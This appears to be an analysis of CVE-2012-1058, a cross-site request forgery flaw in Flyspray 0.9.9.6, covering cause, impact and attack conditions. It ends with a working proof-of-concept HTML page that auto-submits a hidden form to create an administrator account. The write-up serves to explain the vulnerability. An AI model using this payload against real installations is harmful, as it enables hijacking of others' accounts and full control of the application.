Based on the provided information, here's an analysis of CVE-2012-1058:

**Summary:**

CVE-2012-1058 is a Cross-Site Request Forgery (CSRF) vulnerability found in Flyspray version 0.9.9.6.

**Root Cause of Vulnerability:**

The vulnerability stems from the lack of proper CSRF protection mechanisms in Flyspray. Specifically, the application does not adequately validate that requests are originating from a legitimate user session.

**Weaknesses/Vulnerabilities Present:**

*   **CSRF:** The primary vulnerability is the lack of CSRF protection, allowing an attacker to forge requests on behalf of an authenticated user.

**Impact of Exploitation:**

An attacker can leverage this vulnerability to perform actions within the Flyspray application without the user's consent or knowledge, including adding an admin user. The provided exploit demonstrates adding a new administrator account, giving the attacker full control over the application.

**Attack Vectors:**

*   **CSRF:** The attack vector involves crafting a malicious HTML page that, when loaded by a logged-in Flyspray user, automatically submits a forged request to the vulnerable application. This can be done by hosting a malicious page on a site controlled by the attacker, or by injecting the malicious HTML into another web page that the victim visits.
*   **Social Engineering:** Attackers would need to lure a logged-in user to visit the malicious page to initiate the attack.

**Required Attacker Capabilities/Position:**

*   **Target user is authenticated:** The attacker needs the victim to be logged into Flyspray in the same browser session that loads the attacker's malicious page.
*   **Ability to host malicious HTML**: The attacker needs to be able to host a specially crafted malicious page.

**Technical Details**

The exploit code provided in the content demonstrates how this attack can be executed.
```html
<html>
<body onload="javascript:document.forms[0].submit()">
<H2>CSRF Exploit to add ADMIN account</H2>
<form method="POST" name="form0" action="http://127.0.0.1:80/flyspray-0.9.9.6/index.php?do=admin&area=newuser">
<input type="hidden" name="action" value="admin.newuser"/>
<input type="hidden" name="do" value="admin"/>
<input type="hidden" name="area" value="newuser"/>
<input type="hidden" name="user_name" value="root"/>
<input type="hidden" name="user_pass" value="12345678"/>
<input type="hidden" name="user_pass2" value="12345678"/>
<input type="hidden" name="real_name" value="root"/>
<input type="hidden" name="email_address" value="root@root.com"/>
<input type="hidden" name="jabber_id" value=""/>
<input type="hidden" name="notify_type" value="0"/>
<input type="hidden" name="time_zone" value="0"/>
<input type="hidden" name="group_in" value="1"/>
</form>
</body>
</html>
```
This code crafts a POST request to the Flyspray application, setting the required parameters to create a new administrative user.
